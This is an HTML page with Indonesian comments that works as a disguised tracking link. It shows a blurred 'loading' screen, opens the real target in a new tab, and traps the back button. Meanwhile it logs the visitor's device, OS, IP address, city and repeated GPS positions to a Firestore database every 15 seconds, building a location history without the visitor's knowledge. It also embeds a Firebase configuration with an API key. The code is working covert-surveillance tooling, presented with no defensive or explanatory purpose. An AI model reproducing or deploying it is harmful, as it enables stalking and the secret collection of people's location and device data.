<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title></title> <!-- judul kosong -->
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: Arial, sans-serif;
      background: #000;
      color: #fff;
      filter: blur(8px);
      user-select: none;
    }
    h1 { font-size: 24px; opacity: 0.2; }
  </style>
</head>
<body>
  <h1>Sedang memuat...</h1>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { 
      getFirestore, 
      doc, 
      getDoc, 
      collection, 
      addDoc, 
      setDoc, 
      arrayUnion 
    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyAtTakF_Psb-yhxa5NFlcs3Tte5gjYe00",
      authDomain: "locked-1dfad.firebaseapp.com",
      projectId: "locked-1dfad",
      storageBucket: "locked-1dfad.appspot.com",
      messagingSenderId: "237366240355",
      appId: "1:237366240355:web:e3a4f999ff547a07398456",
      measurementId: "G-ZFQC67FMCV"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const urlParams = new URLSearchParams(window.location.search);
    const linkId = urlParams.get('id');
    const linkRef = doc(db, "trackingLinks", linkId);

    let targetUrl = null;
    let clickDocRef = null;

    async function init() {
      const snap = await getDoc(linkRef);
      if (!snap.exists()) {
        document.body.innerHTML = '<h1>Error: Tautan tidak valid</h1>';
        return;
      }
      targetUrl = snap.data().targetUrl;

      // buka link asli di tab baru
      window.open(targetUrl, "_blank");

      // jebakan history
      history.pushState(null, "", location.href);
      window.onpopstate = function() {
        history.pushState(null, "", location.href);
      };

      // buat satu dokumen klik di subcollection
      clickDocRef = await addDoc(collection(linkRef, "liveClicks"), {
        createdAt: Date.now(),
        device: detectDevice().device,
        os: detectDevice().os,
        locationHistory: []
      });

      updateClick();
      setInterval(updateClick, 15000);
    }

    function detectDevice() {
      const ua = navigator.userAgent.toLowerCase();
      let device = "Unknown Device";
      let os = "Unknown OS";
      if (ua.includes("android")) os = "Android";
      else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) os = "iOS";
      else if (ua.includes("win")) os = "Windows";
      else if (ua.includes("mac")) os = "MacOS";
      else if (ua.includes("linux")) os = "Linux";
      if (ua.includes("oppo")) device = "Oppo";
      else if (ua.includes("vivo")) device = "Vivo";
      else if (ua.includes("xiaomi")) device = "Xiaomi";
      else if (ua.includes("redmi")) device = "Xiaomi (Redmi)";
      else if (ua.includes("samsung")) device = "Samsung";
      else if (ua.includes("realme")) device = "Realme";
      else if (ua.includes("huawei")) device = "Huawei";
      else if (ua.includes("infinix")) device = "Infinix";
      else if (ua.includes("asus")) device = "Asus";
      else if (ua.includes("iphone")) device = "iPhone";
      else if (ua.includes("ipad")) device = "iPad";
      return { device, os };
    }

    async function updateClick() {
      if (!clickDocRef) return;
      const data = { lastSeen: Date.now() };

      try {
        const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        const ipv4 = ipData.ip;
        const geo = await fetch(`https://ipapi.co/${ipv4}/json/`).then(r => r.json());
        data.ipInfo = { ip: ipv4, city: geo.city, country: geo.country_name };

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            pos => {
              data.location = {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude
              };
              data.locationHistory = arrayUnion(data.location);
              save(data);
            },
            () => save(data),
            { timeout: 5000 }
          );
        } else {
          save(data);
        }
      } catch (err) {
        save(data);
      }
    }

    async function save(data) {
      try {
        await setDoc(clickDocRef, data, { merge: true });
      } catch (err) {
        console.error("Gagal update Firestore:", err);
      }
    }

    init();
  </script>
</body>
</html>
